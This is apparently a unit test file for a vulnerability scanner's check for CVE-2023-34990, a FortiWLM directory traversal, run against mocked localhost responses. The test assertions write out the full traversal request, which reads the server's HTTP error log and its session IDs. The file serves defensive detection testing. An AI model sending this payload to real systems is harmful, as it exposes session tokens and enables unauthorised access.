"""Unit tests for Agent Asteroid: CVE-2023-34990"""

import requests
import requests_mock as req_mock
from pytest_mock import plugin

from agent import definitions
from agent.exploits import cve_2023_34990


def testCVE202334990_whenVulnerable_reportFinding(
    mocker: plugin.MockerFixture,
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2023-34990 unit test: case when target is vulnerable."""

    mock_fetch_log_file = mocker.patch(
        "agent.exploits.cve_2023_34990._fetch_log_file",
        return_value=(
            """<SCRIPT language="javascript">window.location.href = "/workflow/jsp/logon.jsp;jsessionid=4E1D466A8377449EC3BFABED58A66B14";</SCRIPT>"""
        ),
    )
    requests_mock.get(
        "http://localhost:80/",
        text="""<title>FortiWLM Login</title>""",
        status_code=200,
    )

    exploit_instance = cve_2023_34990.CVE202334990Exploit()

    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 1
    vulnerability = vulnerabilities[0]
    assert vulnerability.entry.title == cve_2023_34990.VULNERABILITY_TITLE
    assert vulnerability.entry.risk_rating == "CRITICAL"
    assert vulnerability.technical_detail == (
        "http://localhost:80/ is vulnerable to CVE-2023-34990, FortiWLM Directory Traversal"
    )
    mock_fetch_log_file.assert_called_once_with(
        "http://localhost:80/ems/cgi-bin/ezrf_lighttpd.cgi?op_type=upgradelogs&imagename=../../../../../../../../../data/apps/nms/logs/httpd_error_log"
    )


def testCVE202334990_whenSafe_reportNothing(
    mocker: plugin.MockerFixture,
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2023-34990 unit test: case when target is not vulnerable."""

    mock_fetch_log_file = mocker.patch(
        "agent.exploits.cve_2023_34990._fetch_log_file", return_value=None
    )
    requests_mock.get(
        "http://localhost:80/",
        text="""<title>FortiWLM Login</title>""",
        status_code=200,
    )

    exploit_instance = cve_2023_34990.CVE202334990Exploit()

    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0
    mock_fetch_log_file.assert_called_once_with(
        "http://localhost:80/ems/cgi-bin/ezrf_lighttpd.cgi?op_type=upgradelogs&imagename=../../../../../../../../../data/apps/nms/logs/httpd_error_log"
    )


def testCVE202334990_whenError_fetchLogFileHandlesErrorGracefully(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2023-34990 unit test: case when _fetch_log_file encounters an error gracefully and returns no vulnerabilities."""

    requests_mock.get(
        "http://localhost:80/",
        text="""<title>FortiWLM Login</title>""",
        status_code=200,
    )
    requests_mock.get(
        "http://localhost:80/ems/cgi-bin/ezrf_lighttpd.cgi",
        exc=requests.exceptions.RequestException("Simulated request exception"),
    )

    exploit_instance = cve_2023_34990.CVE202334990Exploit()
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0


def testCVE202334990_whenLogFileFetchSucceeds_vulnerabilitiesFound(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2023-34990 unit test: case when _fetch_log_file successfully fetches the log file."""

    mock_log_content = "sessionid=ABC1234 sessionid=XYZ5678"
    requests_mock.get(
        "http://localhost:80/ems/cgi-bin/ezrf_lighttpd.cgi",
        text=mock_log_content,
        status_code=200,
    )

    exploit_instance = cve_2023_34990.CVE202334990Exploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert len(vulnerabilities) == 1
    assert vulnerabilities[0].entry.title == cve_2023_34990.VULNERABILITY_TITLE
